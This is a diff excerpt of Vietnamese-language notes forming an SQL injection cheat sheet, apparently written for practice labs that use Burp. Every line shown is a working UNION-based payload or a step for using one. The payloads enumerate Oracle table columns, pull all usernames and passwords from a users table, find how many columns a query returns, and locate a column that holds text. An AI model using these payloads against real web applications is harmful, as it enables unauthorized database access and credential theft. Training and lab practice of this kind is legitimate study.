@@ -56,3 +56,19 @@ Lưu ý: các lệnh SQLI sử dụng dấu + là để thay cho dấu space or 
 '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
 #Truy xuất username và password của tất cả người dùng (Thay tên cột username , password và bảng USER_ABCDEF
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
+@Injection xác định số lượng cột được trả về bởi truy vấn
+(Burp) thay đổi category
+'+UNION+SELECT+NULL--
+or 
+'+UNION+SELECT+NULL,NULL--
+thêm ,NULL cho đến khi ko bị lỗi nữa.
+
+@Tìm một cột chứa văn bản
+#Xác định số cột được trả về bởi truy vấn
+'+UNION+SELECT+NULL,NULL--    (,NULL cộng dần)
+#Thay thế giá trị ngẫu nheien vô null 
+VD: 
+'+UNION+SELECT+'abcd',NULL,NULL--
+'+UNION+SELECT+NULL,'abcd',NULL--
+'+UNION+SELECT+NULL,NULL,'abcd'--
